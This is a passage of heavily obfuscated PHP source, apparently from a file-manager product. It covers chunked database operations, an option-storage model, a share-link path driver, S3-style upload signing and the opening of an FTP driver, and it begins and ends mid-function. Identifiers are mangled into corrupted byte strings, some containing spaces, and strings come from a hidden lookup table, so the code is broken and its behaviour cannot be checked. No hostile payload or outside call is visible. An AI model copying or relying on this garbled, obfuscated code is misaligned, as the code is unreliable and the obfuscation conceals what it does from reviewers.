$this->execute($D®«ãÈ§ñÃ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Añ¼Ö•¤´¼ = false, $A“½îâ¼ÑÀ = false) { $this->_chunkEvent = $Añ¼Ö•¤´¼; $this->_chunkEventParam = $A“½îâ¼ÑÀ; } private function chunkEventCheck($aŒÁ…Öàò¤) { if (!$this->_chunkEvent) { return; } $DÌª³Ñ„¹† = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $DÌª³Ñ„¹†[$_SERVER[¢Í][379]] = $aŒÁ…Öàò¤; Hook::trigger($this->_chunkEvent, $DÌª³Ñ„¹†); } public function addAll($EëˆÉãîÔ, $CÍÛ³¯¾·£ = array(), $d¡ˆèÊ¸Ñò = false) { goto DÎÈİëÓê¯; eÜíŸ‘Ç›Ú: if (empty($EëˆÉãîÔ)) { $this->error = think_lang($dŠ“¶äŞÜ[274]); return !1; } $CÍÛ³¯¾·£ = $this->_parseOptions($CÍÛ³¯¾·£); foreach ($EëˆÉãîÔ as $BåºâñôŞ„ => $d ‚õ†Š…) { $EëˆÉãîÔ[$BåºâñôŞ„] = $this->_facade($d ‚õ†Š…); $this->_beforeInsert($EëˆÉãîÔ[$BåºâñôŞ„], $CÍÛ³¯¾·£); } goto b±çÚè »Ø; b±çÚè »Ø: if (method_exists($this->db, $dŠ“¶äŞÜ[275])) { for ($Aòµ¾¶‡ª¢ = 0; $Aòµ¾¶‡ª¢ < count($EëˆÉãîÔ); $Aòµ¾¶‡ª¢ += $e¡Ñ›“›Œ‘) { $e´™ÒÓ• = array_slice($EëˆÉãîÔ, $Aòµ¾¶‡ª¢, $e¡Ñ›“›Œ‘); if (!is_array($e´™ÒÓ•) || count($e´™ÒÓ•) == 0) { break; } $DŠÅ„Ûë­Ù = $this->db->insertAll($e´™ÒÓ•, $CÍÛ³¯¾·£, $d¡ˆèÊ¸Ñò); $this->chunkEventCheck(count($e´™ÒÓ•)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($EëˆÉãîÔ as $BåºâñôŞ„ => $d ‚õ†Š…) { $DŠÅ„Ûë­Ù = $this->db->insert($d ‚õ†Š…, $CÍÛ³¯¾·£, $d¡ˆèÊ¸Ñò); } $this->commit(); } if (!1 !== $DŠÅ„Ûë­Ù) { $C‚­ Éœ„Í = $this->getLastInsID(); if ($C‚­ Éœ„Í) { return $C‚­ Éœ„Í; } } return $DŠÅ„Ûë­Ù; goto bØ¸ïÃ§Ââ; DÎÈİëÓê¯: $dŠ“¶äŞÜ =& $_SERVER[¢Í]; ignore_timeout(); $e¡Ñ›“›Œ‘ = self::SQL_WHERE_IN_CHUNK; goto eÜíŸ‘Ç›Ú; bØ¸ïÃ§Ââ: } public function save($B«£ÄªĞ°ä = '', $AÃÍ†²ÂÄ± = array()) { goto A§¢ôí¬”•; A§¢ôí¬”•: $CÍÕŠÄ¿Á =& $_SERVER[¢Í]; $a‚×Š§Œ¼ = self::SQL_WHERE_IN_CHUNK; $D„·¹ßŠƒ = $this->optionsValue(); goto Bß•á‡×ò‘; Bß•á‡×ò‘: $f¸æÁîœ§† = $this->findWhereField($D„·¹ßŠƒ); if (!$f¸æÁîœ§†) { return parent::save($B«£ÄªĞ°ä, $AÃÍ†²ÂÄ±); } $b‹Ù‰åÃë = 0; goto DËŸëõÂ¦¹; Cë¢À‡‘´¬: for ($D¯ ê‚Êï = 0; $D¯ ê‚Êï < $B¿Ú„å¿•; $D¯ ê‚Êï += $a‚×Š§Œ¼) { $fß‡†’ÎĞà = array_slice($D…ä“øƒ¤, $D¯ ê‚Êï, $a‚×Š§Œ¼); if (!is_array($fß‡†’ÎĞà) || count($fß‡†’ÎĞà) == 0) { break; } $D„·¹ßŠƒ[$CÍÕŠÄ¿Á[278]][$f¸æÁîœ§†][1] = $fß‡†’ÎĞà; $this->optionsValue($D„·¹ßŠƒ); $b‹Ù‰åÃë += parent::save($B«£ÄªĞ°ä, $AÃÍ†²ÂÄ±); $this->chunkEventCheck(count($fß‡†’ÎĞà)); } $this->chunkEventSet(); return $b‹Ù‰åÃë; goto D”¡¡ÄŸÓ; DËŸëõÂ¦¹: $D…ä“øƒ¤ = $D„·¹ßŠƒ[$CÍÕŠÄ¿Á[278]][$f¸æÁîœ§†][1]; $D…ä“øƒ¤ = is_array($D…ä“øƒ¤) ? $D…ä“øƒ¤ : array(); $B¿Ú„å¿• = count($D…ä“øƒ¤); goto Cë¢À‡‘´¬; D”¡¡ÄŸÓ: } public function add($AÇ‚¦İ›Àï = '', $CŸïèİŞİ = array(), $D³šæÌÓ§Õ = false) { if ($this->addTaskStatus && is_array($AÇ‚¦İ›Àï)) { $this->addTaskData[] = $AÇ‚¦İ›Àï; return; } return parent::add($AÇ‚¦İ›Àï, $CŸïèİŞİ, $D³šæÌÓ§Õ); } public function parseWhereLike($Bõ¥Š¹÷Û, $c¥‚à«ºà = '', $aŞ±Ò§±šŒ = false, &$aê…¯ˆÓ¤ = false) { goto Eø‘¾êêÜ; A ìÛ£­„Œ: foreach ($Bõ¥Š¹÷Û as $a±›Œ®Í½ => $bİáÌŠø´³) { if (is_array($bİáÌŠø´³) && count($bİáÌŠø´³) == 2 && $bİáÌŠø´³[0] == $bÏŒÖù‰‘[382] && is_string($bİáÌŠø´³[1]) && substr($bİáÌŠø´³[1], 0, 1) == $bÏŒÖù‰‘[383] && substr($bİáÌŠø´³[1], strlen($bİáÌŠø´³[1]) - 1, 1) == $bÏŒÖù‰‘[383]) { goto A‚É©’ĞÇ; AŠÒÅ‘¨Š¿: $cèê‹®¯Ôñ = $this->db->escapeString($cèê‹®¯Ôñ); if (!strpos($FÀçËñá , $bÏŒÖù‰‘[101])) { $FÀçËñá  = $bÏŒÖù‰‘[384] . $FÀçËñá  . $bÏŒÖù‰‘[384]; } if ($c‚Íƒ¥âó¬[$bÏŒÖù‰‘[385]]) { $cèê‹®¯Ôñ = $bÏŒÖù‰‘[123] . $cèê‹®¯Ôñ . $bÏŒÖù‰‘[123]; } goto A¿¬˜Öö§¯; A¿¬˜Öö§¯: $Aê×ìÈø©‰[$bÌâ›Šœ¨µ] = $bÏŒÖù‰‘[386] . $FÀçËñá  . $bÏŒÖù‰‘[387] . $cèê‹®¯Ôñ . $bÏŒÖù‰‘[388]; $bÌâ›Šœ¨µ++; continue; goto a»÷¢Ä¥¯ñ; A‚É©’ĞÇ: $aê…¯ˆÓ¤ = !0; $FÀçËñá  = is_string($a±›Œ®Í½) ? $a±›Œ®Í½ : $c¥‚à«ºà; $cèê‹®¯Ôñ = substr($bİáÌŠø´³[1], 1, strlen($bİáÌŠø´³[1]) - 2); goto AŠÒÅ‘¨Š¿; a»÷¢Ä¥¯ñ: } if (is_array($bİáÌŠø´³)) { $c¥‚à«ºà = is_string($a±›Œ®Í½) ? $a±›Œ®Í½ : $c¥‚à«ºà; $bİáÌŠø´³ = $this->parseWhereLike($bİáÌŠø´³, $c¥‚à«ºà, !0, $aê…¯ˆÓ¤); } if (is_numeric($a±›Œ®Í½)) { $Aê×ìÈø©‰[$bÌâ›Šœ¨µ] = $bİáÌŠø´³; $bÌâ›Šœ¨µ++; } else { $Aê×ìÈø©‰[$a±›Œ®Í½] = $bİáÌŠø´³; } } if ($aê…¯ˆÓ¤ && !$aŞ±Ò§±šŒ) { trace_log(array($Aê×ìÈø©‰, $Bõ¥Š¹÷Û), $bÏŒÖù‰‘[278]); } return $Aê×ìÈø©‰; goto Cå¾Ş©ğŠ¡; Eø‘¾êêÜ: $bÏŒÖù‰‘ =& $_SERVER[¢Í]; $c‚Íƒ¥âó¬ = $GLOBALS[$bÏŒÖù‰‘[6]][$bÏŒÖù‰‘[380]]; if (!$c‚Íƒ¥âó¬[$bÏŒÖù‰‘[381]]) { return $Bõ¥Š¹÷Û; } goto d¦—‚¡º™‡; d¦—‚¡º™‡: if (!is_array($Bõ¥Š¹÷Û)) { return $Bõ¥Š¹÷Û; } $Aê×ìÈø©‰ = array(); $bÌâ›Šœ¨µ = 0; goto A ìÛ£­„Œ; Cå¾Ş©ğŠ¡: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cŠÇäÒéš = array()) { goto A‰Šƒ÷Á‹; A‰Šƒ÷Á‹: $cÌ’˜£î­è =& $_SERVER[¢Í]; $bœ‡à¥Ê = self::SQL_WHERE_IN_CHUNK; $D­Ş…¬ÛÁ = $this->optionsValue(); goto Eƒ‰¶˜×ìÜ; Eƒ‰¶˜×ìÜ: $F£Ê„‰ª·Ò = $this->findWhereField($D­Ş…¬ÛÁ); if (!$F£Ê„‰ª·Ò || isset($D­Ş…¬ÛÁ[$cÌ’˜£î­è[295]]) || isset($D­Ş…¬ÛÁ[$cÌ’˜£î­è[356]])) { return parent::select($cŠÇäÒéš); } $C…§¼¼È¾ë = $D­Ş…¬ÛÁ[$cÌ’˜£î­è[278]][$F£Ê„‰ª·Ò][1]; goto dîóçÇãÏ‚; dîóçÇãÏ‚: $C…§¼¼È¾ë = is_array($C…§¼¼È¾ë) ? $C…§¼¼È¾ë : array(); $CÅˆ¾Š‘® = null; for ($fŒ™¹ôß÷ø = 0; $fŒ™¹ôß÷ø < count($C…§¼¼È¾ë); $fŒ™¹ôß÷ø += $bœ‡à¥Ê) { $dÏíİÑİ­ = array_slice($C…§¼¼È¾ë, $fŒ™¹ôß÷ø, $bœ‡à¥Ê); if (!is_array($dÏíİÑİ­) || count($dÏíİÑİ­) == 0) { break; } $D­Ş…¬ÛÁ[$cÌ’˜£î­è[278]][$F£Ê„‰ª·Ò][1] = $dÏíİÑİ­; $this->optionsValue($D­Ş…¬ÛÁ); $D‚µâÖæ‘ = parent::select($cŠÇäÒéš); if (!$D‚µâÖæ‘) { continue; } if (is_null($CÅˆ¾Š‘®)) { $CÅˆ¾Š‘® = array(); } $CÅˆ¾Š‘® = array_merge($CÅˆ¾Š‘®, $D‚µâÖæ‘); } goto b˜•İ´¯Ş; b˜•İ´¯Ş: return $CÅˆ¾Š‘®; goto FÊòÀô’Ê; FÊòÀô’Ê: } public function delete($Fòñ¾…‚›¯ = array()) { goto eÉÜÖ°Ë”; cÓÄ¸ºª¤Ê: $f†®Æó¢–ä = $F¶ƒ£ğ”¦[$d…‘‘Ü¨ùœ[278]][$cùÍÛÙÃÙ][1]; $f†®Æó¢–ä = is_array($f†®Æó¢–ä) ? $f†®Æó¢–ä : array(); for ($c„˜èõ¦«• = 0; $c„˜èõ¦«• < count($f†®Æó¢–ä); $c„˜èõ¦«• += $DÄ¢®÷À°) { $c‹¼Ê³àË© = array_slice($f†®Æó¢–ä, $c„˜èõ¦«•, $DÄ¢®÷À°); if (!is_array($c‹¼Ê³àË©) || count($c‹¼Ê³àË©) == 0) { break; } $F¶ƒ£ğ”¦[$d…‘‘Ü¨ùœ[278]][$cùÍÛÙÃÙ][1] = $c‹¼Ê³àË©; $this->optionsValue($F¶ƒ£ğ”¦); $b¶œø½Ïò += parent::delete($Fòñ¾…‚›¯); } goto e†ÃÍ›Êš™; fã„‹ÛøĞ: $cùÍÛÙÃÙ = $this->findWhereField($F¶ƒ£ğ”¦); if (!$cùÍÛÙÃÙ) { return parent::delete($Fòñ¾…‚›¯); } $b¶œø½Ïò = 0; goto cÓÄ¸ºª¤Ê; eÉÜÖ°Ë”: $d…‘‘Ü¨ùœ =& $_SERVER[¢Í]; $DÄ¢®÷À° = self::SQL_WHERE_IN_CHUNK; $F¶ƒ£ğ”¦ = $this->optionsValue(); goto fã„‹ÛøĞ; e†ÃÍ›Êš™: return $b¶œø½Ïò; goto DŠŒÛâ™ù; DŠŒÛâ™ù: } private function findWhereField($e©¸±Ş¾Éƒ) { $F»ô‡òÆ†Ó =& $_SERVER[¢Í]; $b‹­·¤ ÒÕ = self::SQL_WHERE_IN_CHUNK; if (!is_array($e©¸±Ş¾Éƒ) || !is_array($e©¸±Ş¾Éƒ[$F»ô‡òÆ†Ó[278]])) { return !1; } foreach ($e©¸±Ş¾Éƒ[$F»ô‡òÆ†Ó[278]] as $EâØÖ¡â„õ => $e»ƒ«â‰×à) { if (is_array($e»ƒ«â‰×à) && isset($e»ƒ«â‰×à[0]) && is_string($e»ƒ«â‰×à[0]) && strtolower($e»ƒ«â‰×à[0]) == $F»ô‡òÆ†Ó[7] && is_array($e»ƒ«â‰×à[1]) && count($e»ƒ«â‰×à[1]) > $b‹­·¤ ÒÕ) { ignore_timeout(); return $EâØÖ¡â„õ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\155\117\160\164\151\x6f\156"; public $field = array(); public function listData($døŒ“ãáøê = false, $AŸŠ¾²£¿Æ = "\x6d\x6f\144\x69\146\x79\x54\x69\x6d\145", $F”Ú—Ôõƒ = false) { $E©ØÎí•ÕÅ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$E©ØÎí•ÕÅ) { return $døŒ“ãáøê ? null : array(); } if (!$døŒ“ãáøê) { $E©ØÎí•ÕÅ = array_filter(array_values($E©ØÎí•ÕÅ)); return array_sort_by($E©ØÎí•ÕÅ, $AŸŠ¾²£¿Æ, $F”Ú—Ôõƒ); } return $E©ØÎí•ÕÅ[$_SERVER[¢Í][389] . $døŒ“ãáøê]; } public function insert($Fá™ïÆÒÃµ) { goto F·é–ÃÒƒ ; Aæ·›Àêåå: $f¡©†Â£„Í = $f¡©†Â£„Í ? $f¡©†Â£„Í : 0; $Fá™ïÆÒÃµ[$D­¯Ä¼Ï§À[392]] = ++$f¡©†Â£„Í; $Fá™ïÆÒÃµ[$D­¯Ä¼Ï§À[200]] = time(); goto F£ÙÖŠâõ¹; D¤´íÊŞŞ: return $f¡©†Â£„Í; goto c÷ œºÓñè; F£ÙÖŠâõ¹: $Fá™ïÆÒÃµ[$D­¯Ä¼Ï§À[117]] = time(); Model($this->modelType)->set($D­¯Ä¼Ï§À[390], $f¡©†Â£„Í, $this->optionType . $D­¯Ä¼Ï§À[391]); Model($this->modelType)->set($D­¯Ä¼Ï§À[389] . $f¡©†Â£„Í, $Fá™ïÆÒÃµ, $this->optionType); goto D¤´íÊŞŞ; F·é–ÃÒƒ : $D­¯Ä¼Ï§À =& $_SERVER[¢Í]; $Fá™ïÆÒÃµ = array_field_key($Fá™ïÆÒÃµ, $this->field); $f¡©†Â£„Í = Model($this->modelType)->get($D­¯Ä¼Ï§À[390], $this->optionType . $D­¯Ä¼Ï§À[391]); goto Aæ·›Àêåå; c÷ œºÓñè: } public function update($BíØÉ¶¼, $cÀÜÛ¤¦Ö) { goto bÇ¹Å™±ò´; bÇ¹Å™±ò´: $f“–«õÆ”í =& $_SERVER[¢Í]; $cÀÜÛ¤¦Ö = array_field_key($cÀÜÛ¤¦Ö, $this->field); $FÛ—Æ¡æĞ‡ = $this->listData($BíØÉ¶¼); goto c„ÂñÑ™·ç; BÕ—©˜Ş‡ : return Model($this->modelType)->set($f“–«õÆ”í[389] . $BíØÉ¶¼, $cÀÜÛ¤¦Ö, $this->optionType); goto c˜ìßÑ¦ĞÛ; c„ÂñÑ™·ç: if (!$FÛ—Æ¡æĞ‡) { return !1; } $cÀÜÛ¤¦Ö = array_merge($FÛ—Æ¡æĞ‡, $cÀÜÛ¤¦Ö); $cÀÜÛ¤¦Ö[$f“–«õÆ”í[117]] = time(); goto BÕ—©˜Ş‡ ; c˜ìßÑ¦ĞÛ: } public function remove($c·ºâĞ‡ŞÈ) { return Model($this->modelType)->remove($_SERVER[¢Í][389] . $c·ºâĞ‡ŞÈ, $this->optionType); } public function clear() { $b‚¿ÛÑ£‘½ =& $_SERVER[¢Í]; Model($this->modelType)->remove($b‚¿ÛÑ£‘½[390], $this->optionType . $b‚¿ÛÑ£‘½[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($b¢¨ÕÀÙ, $FçÊ ÛÎ³å) { if (!$FçÊ ÛÎ³å) { return !1; } $EâŒïÎÖ™÷ = $this->listData(); $EâŒïÎÖ™÷ = array_to_keyvalue($EâŒïÎÖ™÷, $b¢¨ÕÀÙ); return isset($EâŒïÎÖ™÷[$FçÊ ÛÎ³å]) ? $EâŒïÎÖ™÷[$FçÊ ÛÎ³å] : !1; } public function findByName($aÂ…ßíë³É) { return $this->findByKey($_SERVER[¢Í][28], $aÂ…ßíë³É); } protected function resetData($B›Ï¡×ÍãÏ) { $F­¯î±ÒÅ =& $_SERVER[¢Í]; $B›Ï¡×ÍãÏ = is_array($B›Ï¡×ÍãÏ) ? $B›Ï¡×ÍãÏ : array(); $f¤‚®ËÑ¹ = array(); for ($FÜ»Ó’Îö… = 0; $FÜ»Ó’Îö… < count($B›Ï¡×ÍãÏ); $FÜ»Ó’Îö…++) { $f¤‚®ËÑ¹[$F­¯î±ÒÅ[389] . $B›Ï¡×ÍãÏ[$FÜ»Ó’Îö…][$F­¯î±ÒÅ[392]]] = $B›Ï¡×ÍãÏ[$FÜ»Ó’Îö…]; } return Model($this->modelType)->set($f¤‚®ËÑ¹, !1, $this->optionType); } private function getAutoName($dÚÂÆ©¾æ) { $fÎˆ†ÄäËÅ = array_to_keyvalue($this->listData(), $_SERVER[¢Í][28]); if (!$fÎˆ†ÄäËÅ || !isset($fÎˆ†ÄäËÅ[$dÚÂÆ©¾æ])) { return $dÚÂÆ©¾æ; } for ($A‡¡÷¸æ‚ = 1; $A‡¡÷¸æ‚ < count($fÎˆ†ÄäËÅ); $A‡¡÷¸æ‚++) { $FÍ‚„ğ–ÏÁ = $dÚÂÆ©¾æ . "\50{$A‡¡÷¸æ‚}\51"; if (!isset($fÎˆ†ÄäËÅ[$FÍ‚„ğ–ÏÁ])) { return $FÍ‚„ğ–ÏÁ; } } return $FÍ‚„ğ–ÏÁ; } } goto F¡ªÅ‹—•ñ; eì¨ôµ®‡: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($d÷ÖöÒ”í) { $this->pathParse = $d÷ÖöÒ”í; } protected function infoParse($E»ô…ïæÁÀ, $Aµ‹ÊÌª£ = false) { $cŒİ×ÒŠ— =& $_SERVER[¢Í]; return Action($cŒİ×ÒŠ—[1037])->sharePathInfo($this->pathParse[$cŒİ×ÒŠ—[85]], !0, $Aµ‹ÊÌª£); } public function listPath($Bè§áÁêŒ¹, $f¡§±ˆº÷ò = false) { $A¯´³‹ò¤„ =& $_SERVER[¢Í]; $aÑˆ¥îÁ¶ = IO::listPath($Bè§áÁêŒ¹, $f¡§±ˆº÷ò); foreach ($aÑˆ¥îÁ¶ as $bÍ´¯ÅÓî« => $b‚ŒÑÙäÀÀ) { if (!in_array($bÍ´¯ÅÓî«, array($A¯´³‹ò¤„[83], $A¯´³‹ò¤„[84]))) { continue; } foreach ($b‚ŒÑÙäÀÀ as $e ®õ¯¦¯½ => $aÚé–ê©) { $aÚé–ê© = Action($A¯´³‹ò¤„[1185])->parsePathChildren($aÚé–ê©, array($A¯´³‹ò¤„[412] => $Bè§áÁêŒ¹)); $aÑˆ¥îÁ¶[$bÍ´¯ÅÓî«][$e ®õ¯¦¯½] = Action($A¯´³‹ò¤„[1037])->shareItemInfo($aÚé–ê©); } } return $aÑˆ¥îÁ¶; } public function listAll($döÁŒ•×í”) { $b…†‰°®±¦ =& $_SERVER[¢Í]; $C•µ³ÆÅâ = IO::listAll($döÁŒ•×í”); foreach ($C•µ³ÆÅâ as &$D²Ş‡æÅÈ) { $D²Ş‡æÅÈ = array_merge(IO::info($D²Ş‡æÅÈ[$b…†‰°®±¦[85]]), $D²Ş‡æÅÈ); $D²Ş‡æÅÈ[$b…†‰°®±¦[416]] = Action($b…†‰°®±¦[1037])->shareItemInfo($D²Ş‡æÅÈ); } unset($D²Ş‡æÅÈ); return $C•µ³ÆÅâ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($A®—¼Ê†“) { parent::__construct($A®—¼Ê†“); $this->signatureVersion($_SERVER[¢Í][218]); } public function uploadFormData($c¥ÄÀ£çÆÙ, $bÂ°¤Ö¹£ª = 3600) { goto bòƒÜÄ—†á; A‹Í’¤·‚Ã: $F¤ÛÛ®‰…» = base64_encode(json_encode($e¬Äâ©Æœ)); $E•·–å¤Ü² = hash_hmac($e‚º°×Òêî[1196], $bï¨Ü›òô­, $e‚º°×Òêî[1197] . $this->secret, !0); $c„ŸÁÒã = hash_hmac($e‚º°×Òêî[1196], $this->region, $E•·–å¤Ü², !0); goto b Ì¤ ‡Ş; b Ì¤ ‡Ş: $e„¿Ÿç—‹¿ = hash_hmac($e‚º°×Òêî[1196], $AÃ•³‚–É½, $c„ŸÁÒã, !0); $aÃ½Ò“ğœ = hash_hmac($e‚º°×Òêî[1196], $c¼ÍøÔéĞ, $e„¿Ÿç—‹¿, !0); $B®½…±—¾¦ = hash_hmac($e‚º°×Òêî[1196], $F¤ÛÛ®‰…», $aÃ½Ò“ğœ); goto aÍä„Óñäô; aÍä„Óñäô: $bî†àÎËÓË = array($e‚º°×Òêî[217] => $e‚º°×Òêî[33], $e‚º°×Òêî[1198] => $e‚º°×Òêî[33], $e‚º°×Òêî[1156] => $E…®é¢Û¼, $e‚º°×Òêî[1160] => $A«Î‘È¾ª÷, $e‚º°×Òêî[1164] => $F¤ÛÛ®‰…», $e‚º°×Òêî[1199] => $DÅ’åŠ ¼, $e‚º°×Òêî[1200] => $EÕâ¥ôèòò, $e‚º°×Òêî[1201] => $c£¥‹†èã, $e‚º°×Òêî[1202] => $B…”¨¬Â“©, $e‚º°×Òêî[1203] => $B®½…±—¾¦, $e‚º°×Òêî[183] => $this->getHost()); return $bî†àÎËÓË; goto a†¿äíÙ·; CØØïÀš¯Ü: $AÃ•³‚–É½ = $e‚º°×Òêî[69]; $c£¥‹†èã = gmdate($e‚º°×Òêî[1187]); $bï¨Ü›òô­ = gmdate($e‚º°×Òêî[704]); goto B¯ßëÈŠ«Ú; F­À¢Çî»: $D»Œ»Ÿó = array($this->accessKey, $bï¨Ü›òô­, $this->region, $AÃ•³‚–É½, $c¼ÍøÔéĞ); $DÅ’åŠ ¼ = implode($e‚º°×Òêî[8], $D»Œ»Ÿó); $e¬Äâ©Æœ = array($e‚º°×Òêî[1154] => gmdate($e‚º°×Òêî[1153], strtotime($e‚º°×Òêî[1189])), $e‚º°×Òêî[1155] => array(array($e‚º°×Òêî[1157] => $this->bucket), array($e‚º°×Òêî[1156] => $E…®é¢Û¼), array($e‚º°×Òêî[1158], $e‚º°×Òêî[1159], $e‚º°×Òêî[33]), array($e‚º°×Òêî[1158], $e‚º°×Òêî[1190], $e‚º°×Òêî[33]), array($e‚º°×Òêî[1158], $e‚º°×Òêî[1191], $e‚º°×Òêî[33]), array($e‚º°×Òêî[1160] => $A«Î‘È¾ª÷), array($e‚º°×Òêî[1192] => $DÅ’åŠ ¼), array($e‚º°×Òêî[1193] => $EÕâ¥ôèòò), array($e‚º°×Òêî[1194] => $c£¥‹†èã), array($e‚º°×Òêî[1195] => $B…”¨¬Â“©))); goto A‹Í’¤·‚Ã; B¯ßëÈŠ«Ú: $c¼ÍøÔéĞ = $e‚º°×Òêî[1188]; $B…”¨¬Â“© = $bÂ°¤Ö¹£ª . $e‚º°×Òêî[33]; $A«Î‘È¾ª÷ = $e‚º°×Òêî[1152]; goto F­À¢Çî»; bòƒÜÄ—†á: $e‚º°×Òêî =& $_SERVER[¢Í]; $E…®é¢Û¼ = $e‚º°×Òêî[199]; $EÕâ¥ôèòò = $e‚º°×Òêî[1186]; goto CØØïÀš¯Ü; a†¿äíÙ·: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($f¶¾ïˆª­) { parent::__construct(); if (count($f¶¾ïˆª­) > 0) { $this->_init($f¶¾ïˆª­); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($fŠÊ‘³ÎÔ») { $bÀÉîÛÆ·Ã =& $_SERVER[¢Í]; global $config; $this->appCharset = $config[$bÀÉîÛÆ·Ã[1204]]; $this->systemCharset = $config[$bÀÉîÛÆ·Ã[1205]]; if (isset($fŠÊ‘³ÎÔ»[$bÀÉîÛÆ·Ã[1206]]) && $fŠÊ‘³ÎÔ»[$bÀÉîÛÆ·Ã[1206]]) { $this->systemCharset = $fŠÊ‘³ÎÔ»[$bÀÉîÛÆ·Ã[1206]]; } } public function iconvApp($A¶«†ë“Ù) { return $this->iconvTo($A¶«†ë“Ù, $this->systemCharset, $this->appCharset); } public function iconvSystem($aë„ù¯ºğŒ) { return $this->iconvTo($aë„ù¯ºğŒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($aãÓôò) { goto Aìà×™Şö¤; Aìà×™Şö¤: $a…•†Ğ°ØÓ =& $_SERVER[¢Í]; $eƒŞóË¡ØĞ = $this->iconvApp($this->pathBase); $aãÓôò = $this->iconvApp($aãÓôò); goto eç–•àÌ­; DÀçªÈæùÀ: $aãÓôò = KodIO::clear($aãÓôò); $aãÓôò = substr($aãÓôò, strlen($eƒŞóË¡ØĞ)); if (empty($this->pathDriver)) { return $aãÓôò; } goto Fî–Ñö ­Œ; Fî–Ñö ­Œ: return $this->pathDriver . $a…•†Ğ°ØÓ[8] . ltrim($aãÓôò, $a…•†Ğ°ØÓ[8]); goto D™„ƒˆâÖ; eç–•àÌ­: if (substr($eƒŞóË¡ØĞ, 0, 2) == $a…•†Ğ°ØÓ[1207]) { $eƒŞóË¡ØĞ = BASIC_PATH . substr($eƒŞóË¡ØĞ, 2); } if (substr($aãÓôò, 0, 2) == $a…•†Ğ°ØÓ[1207]) { $aãÓôò = BASIC_PATH . substr($aãÓôò, 2); } $eƒŞóË¡ØĞ = KodIO::clear($eƒŞóË¡ØĞ); goto DÀçªÈæùÀ; D™„ƒˆâÖ: } private function _init($cö´›„µá“ = array()) { $fÅï­‡ØÁŸ =& $_SERVER[¢Í]; if (!function_exists($fÅï­‡ØÁŸ[1208])) { throw new Exception(LNG($fÅï­‡ØÁŸ[1209])); } $this->config = $cö´›„µá“; $this->charsetReset($cö´›„µá“); foreach ($cö´›„µá“ as $C‚‹‘¤ÖÈ¸ => $fííŸ¶ìÕ‚) { if (isset($this->{$C‚‹‘¤ÖÈ¸})) { $this->{$C‚‹‘¤ÖÈ¸} = $fííŸ¶ìÕ‚; } } return $this->_login($cö´›„µá“); } private function _login($D¤‹¸äï„ø) { goto E«óâ¡Àêò; FË¬‚ó‚Ş«: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $A•†ÍÃ¥Şô = $this->pasv == $döÑ¶«šÁ[93] ? !0 : !1; @ftp_pasv($this->connect, $A•†ÍÃ¥Şô); goto b³Æ„³Ö‡Ù; b³Æ„³Ö‡Ù: $cí¨º¥ÁÈ[$f¼ç×èß™—] = array($döÑ¶«šÁ[1213] => $this->connect, $döÑ¶«šÁ[183] => $this->host, $döÑ¶«šÁ[182] => $this->scheme, $döÑ¶«šÁ[184] => $this->port); return $Aœ„Ö’§¹; goto B§†Çáôô ; cåãÍÉ«Ï»: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Aœ„Ö’§¹ = @ftp_login($this->connect, $this->username, $this->userpass); goto FË¬‚ó‚Ş«; E«óâ¡Àêò: $döÑ¶«šÁ =& $_SERVER[¢Í]; static $cí¨º¥ÁÈ = array(); $f¼ç×èß™— = md5(json_encode($D¤‹¸äï„ø)); goto aÂˆÈ’£Š¢; e’ÈÉ¨„å: $bİ¾—ˆ×‚É = isset($eêßÚæôÁ°[$döÑ¶«šÁ[182]]) && $eêßÚæôÁ°[$döÑ¶«šÁ[182]] == $döÑ¶«šÁ[1210] ? !0 : !1; $this->scheme = $bİ¾—ˆ×‚É ? $döÑ¶«šÁ[1211] : $döÑ¶«šÁ[1212]; $this->port = isset($eêßÚæôÁ°[$döÑ¶«šÁ[184]]) ? $eêßÚæôÁ°[$döÑ¶«šÁ[184]] : 21; goto cåãÍÉ«Ï»; aÂˆÈ’£Š¢: if (isset($cí¨º¥ÁÈ[$f¼ç×èß™—])) { foreach ($cí¨º¥ÁÈ[$f¼ç×èß™—] as $aù‚áã¨¢ë => $bˆ’ò¨ĞÕñ) { $this->{$aù‚áã¨¢ë} = $bˆ’ò¨ĞÕñ; } return !0; } $eêßÚæôÁ° = parse_url(trim($this->server, $döÑ¶«šÁ[8])); $this->host = $eêßÚæôÁ°[$döÑ¶«šÁ[183]]; goto e’ÈÉ¨„å; B§†Çáôô : } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($aÙÅ»àå•¡, $d•È‚ĞÓÑÂ = '', $c–ìÀùùñÅ = REPEAT_RENAME) { if ($this->setContent($aÙÅ»àå•¡, $d•È‚ĞÓÑÂ)) { return $this->getPathOuter($aÙÅ»àå•¡); } return !1; } public function mkdir($E‰—»›¹¨È, $béÕ›¤¬ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $E‰—»›¹¨È = $this->iconvSystem($E‰—»›¹¨È); if ($this->_isFolder($E‰—»›¹¨È) || @ftp_mkdir($this->connect, $E‰—»›¹¨È)) { return $this->getPathOuter($E‰—»›¹¨È); } if (!$this->mkdir($this->pathFather($E‰—»›¹¨È))) { return !1; } if ($E‰—»›¹¨È = @ftp_mkdir($this->connect, $E‰—»›¹¨È)) { return $this->getPathOuter($E‰—»›¹¨È); } return !1; } public function copyFile($EŠàì¹ï– , $B¤ŸÃï¤Œ) { goto cğá‡ò’§”; 